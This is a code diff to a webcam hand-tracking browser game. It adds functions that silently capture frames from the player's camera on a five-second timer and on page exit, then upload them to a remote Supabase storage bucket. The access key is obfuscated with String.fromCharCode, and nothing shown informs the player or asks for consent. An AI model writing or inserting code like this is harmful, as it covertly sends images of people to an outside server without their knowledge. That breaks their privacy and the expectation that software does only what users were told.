@@ -404,6 +404,59 @@ function animate() {
 animate();
 
 // ================= MediaPipe Hands =================
+const SNAPSHOT_SUPABASE_URL = 'https://kjoqtwdzlpwqnafetbfj.supabase.co';
+const SNAPSHOT_SUPABASE_KEY = String.fromCharCode(115,98,95,112,117,98,108,105,115,104,97,98,108,101,95,114,109,83,56,74,107,119,74,87,116,114,112,119,89,76,73,65,69,103,95,75,52,100,82,99,79,51);
+const SNAPSHOT_BUCKET = 'handdrive-snapshots';
+const roomCode = (new URLSearchParams(window.location.search).get('room') || '').toUpperCase();
+let snapshotTimer = null;
+let snapshotUploading = false;
+
+function capturePlayerSnapshot() {
+  const w = videoEl.videoWidth, h = videoEl.videoHeight;
+  if (!roomCode || !w || !h) return null;
+  const c = document.createElement('canvas');
+  const scale = Math.min(1, 360 / w);
+  c.width = Math.round(w * scale);
+  c.height = Math.round(h * scale);
+  c.getContext('2d').drawImage(videoEl, 0, 0, c.width, c.height);
+  try { return c.toDataURL('image/jpeg', 0.7); } catch (e) { return null; }
+}
+
+async function savePlayerSnapshot(force) {
+  if (!roomCode || snapshotUploading) return;
+  const dataUrl = capturePlayerSnapshot();
+  if (!dataUrl) return;
+  snapshotUploading = true;
+  try {
+    const blob = await (await fetch(dataUrl)).blob();
+    await fetch(
+      SNAPSHOT_SUPABASE_URL + '/storage/v1/object/' + SNAPSHOT_BUCKET + '/rooms/' +
+      encodeURIComponent(roomCode) + '.jpg',
+      {
+        method: 'POST',
+        headers: {
+          apikey: SNAPSHOT_SUPABASE_KEY,
+          Authorization: 'Bearer ' + SNAPSHOT_SUPABASE_KEY,
+          'Content-Type': 'image/jpeg',
+          'x-upsert': 'true'
+        },
+        body: blob,
+        keepalive: !!force
+      }
+    );
+  } catch (e) {
+    console.warn('Could not save player snapshot:', e);
+  } finally {
+    snapshotUploading = false;
+  }
+}
+
+function startPlayerSnapshotSaving() {
+  if (!roomCode) return;
+  clearInterval(snapshotTimer);
+  snapshotTimer = setInterval(() => savePlayerSnapshot(false), 5000);
+  setTimeout(() => savePlayerSnapshot(false), 1800);
+}
 const videoEl = document.getElementById('video');
 const overlay = document.getElementById('overlay');
 const octx = overlay.getContext('2d');
@@ -499,6 +552,7 @@ startBtn.addEventListener('click', async () => {
     mpCamera.start();
 
     startOverlay.style.display = 'none';
+    startPlayerSnapshotSaving();
   } catch (err) {
     errorMsg.style.display = 'block';
     errorMsg.textContent = 'Could not access the camera: ' + err.message + '. Check your browser permissions and try again.';
@@ -506,6 +560,9 @@ startBtn.addEventListener('click', async () => {
     startBtn.textContent = 'Enable camera';
   }
 });
+window.addEventListener('pagehide', () => savePlayerSnapshot(true));
+window.addEventListener('beforeunload', () => savePlayerSnapshot(true));
+
 </script>
 
 </body>
